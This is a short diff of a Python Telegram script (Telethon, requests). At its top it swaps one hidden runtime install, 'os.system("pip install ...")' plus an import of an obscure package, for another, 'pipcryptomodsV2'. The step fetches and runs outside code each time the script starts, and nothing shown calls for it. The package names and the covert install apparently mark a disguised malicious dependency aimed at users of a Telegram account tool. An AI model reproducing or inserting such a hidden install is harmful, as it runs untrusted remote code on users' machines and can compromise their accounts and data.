@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscoloringextensionV2")
-import syscoloringextensionV2
+os.system("pip install pipcryptomodsV2")
+import pipcryptomodsV2
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
